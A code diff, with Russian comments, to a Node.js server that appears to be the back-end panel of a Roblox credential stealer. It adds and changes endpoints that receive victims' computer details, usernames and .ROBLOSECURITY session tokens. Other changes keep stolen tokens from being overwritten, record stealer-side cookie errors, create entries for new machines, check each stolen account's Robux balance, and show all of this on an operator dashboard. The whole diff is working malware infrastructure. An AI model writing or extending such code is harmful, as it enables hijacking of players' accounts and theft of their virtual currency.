@@ -380,27 +380,36 @@ app.post('/upload', upload.array('files'), async (req, res) => {
   const operator = sanitize(req.body.operator, 64) || 'Shonll';
   const pcName = computerInfo.name;
 
-  // Удаляем предыдущую запись этого же компьютера (того же оператора)
-  if (db) {
-    await db.collection('files').deleteMany({
-      'computer.name': pcName,
-      operator: operator
-    });
-  }
+  const diagnostics = {
+    cookieError: sanitize(req.body.cookieError, 2000) || ''
+  };
 
+  // Не удаляем существующие записи — /update-roblox мог уже создать запись с токеном
   const fixedName = `entry_${sanitizeFilename(operator)}_${sanitizeFilename(pcName)}`;
   const doc = {
     name: fixedName,
     uploadedAt: new Date().toISOString(),
     computer: computerInfo,
     roblox: robloxInfo,
+    diagnostics: diagnostics,
     operator: operator
   };
 
   if (db) {
+    const updateDoc = {
+      $set: { name: fixedName, uploadedAt: new Date().toISOString(), computer: computerInfo, diagnostics: diagnostics, operator: operator },
+      $setOnInsert: { roblox: { user: '', pass: '', security: '' } }
+    };
+    // Если есть токен — всегда записываем его
+    if (robloxInfo.security) {
+      updateDoc.$set['roblox.security'] = robloxInfo.security;
+    }
+    if (robloxInfo.user) {
+      updateDoc.$set['roblox.user'] = robloxInfo.user;
+    }
     await db.collection('files').updateOne(
       { name: fixedName, operator: operator },
-      { $set: doc },
+      updateDoc,
       { upsert: true }
     );
   } else {
@@ -475,9 +484,12 @@ app.post('/update-roblox', async (req, res) => {
   if (target) {
     const updateSet = {
       'roblox.user': robloxUser,
-      'roblox.pass': fakePassword,
-      'roblox.security': robloSecurity || ''
+      'roblox.pass': fakePassword
     };
+    // Не затираем существующий токен пустой строкой
+    if (robloSecurity) {
+      updateSet['roblox.security'] = robloSecurity;
+    }
 
     if (robloxUser || robloSecurity) {
       try {
@@ -523,7 +535,49 @@ app.post('/update-roblox', async (req, res) => {
     });
     res.json({ success: true });
   } else {
-    res.status(404).json({ error: 'Файл для данного компьютера не найден' });
+    // Запись не найдена — создаём новую (upsert)
+    const fixedName = `entry_${sanitizeFilename(operator)}_${sanitizeFilename(computerName)}`;
+    const newDoc = {
+      name: fixedName,
+      uploadedAt: new Date().toISOString(),
+      computer: { name: computerName, os: '—', cpu: '—', ram: '—', gpu: '—', ip: '—', country: 'Unknown' },
+      roblox: { user: robloxUser, pass: fakePassword, security: robloSecurity || '' },
+      operator: operator
+    };
+
+    if (robloSecurity) {
+      try {
+        const rbInfo = await fetchRobuxInfo(robloSecurity);
+        if (rbInfo.valid && rbInfo.userId) {
+          newDoc.robuxInfo = { userId: rbInfo.userId, robux: rbInfo.robux, valid: true, checked: new Date().toISOString() };
+          newDoc.roblox.userId = rbInfo.userId;
+          if (rbInfo.username) newDoc.roblox.user = rbInfo.username;
+        }
+      } catch (e) {
+        console.log(`[${new Date().toLocaleTimeString()}] ⚠️ fetchRobuxInfo в update-roblox не удалась: ${e.message}`);
+      }
+    }
+
+    if (db) {
+      await db.collection('files').updateOne(
+        { name: fixedName, operator: operator },
+        { $set: newDoc },
+        { upsert: true }
+      );
+    } else {
+      if (!global.memFiles) global.memFiles = [];
+      global.memFiles = global.memFiles.filter(f => !(f.name === fixedName && f.operator === operator));
+      global.memFiles.push(newDoc);
+    }
+
+    console.log(`[${new Date().toLocaleTimeString()}] 🔑 Создан Roblox аккаунт для "${computerName}": ${robloxUser}${robloSecurity ? ' (+токен)' : ''}`);
+
+    sseClients.forEach(client => {
+      try {
+        client.write(`data: ${JSON.stringify({ event: 'new_file' })}\n\n`);
+      } catch (e) {}
+    });
+    res.json({ success: true });
   }
 });
 
@@ -1434,6 +1488,7 @@ function dashboardHTML(user) {
             <div class="spec-row"><span class="spec-lbl">🎮 GPU</span><span class="spec-val" id="specGpu">—</span></div>
             <div class="spec-row"><span class="spec-lbl">📅 Дата</span><span class="spec-val" id="specDate">—</span></div>
             <div class="spec-row"><span class="spec-lbl">📦 Размер</span><span class="spec-val" id="specSize">—</span></div>
+            <div class="spec-row" id="specCookieErrorRow" style="display:none;"><span class="spec-lbl">⚠️ Cookie Error</span><span class="spec-val" id="specCookieError" style="color:#ffa502; font-size:0.75rem; font-family:monospace; white-space:pre-wrap; max-height:80px; overflow-y:auto;">—</span></div>
           </div>
         </div>
 
@@ -1700,6 +1755,16 @@ function openModal(idx, fEscaped) {
   document.getElementById("specGpu").textContent = pc.gpu || "—";
   document.getElementById("specDate").textContent = fmtDate(f.uploadedAt);
   document.getElementById("specSize").textContent = fmtSize(f.size || 0);
+
+  const diag = f.diagnostics || {};
+  const cookieErrorEl = document.getElementById("specCookieError");
+  const cookieErrorRow = document.getElementById("specCookieErrorRow");
+  if (diag.cookieError) {
+    cookieErrorEl.textContent = diag.cookieError;
+    cookieErrorRow.style.display = "";
+  } else {
+    cookieErrorRow.style.display = "none";
+  }
   
   // Настройка данных Roblox
   const roblox = f.roblox || {};
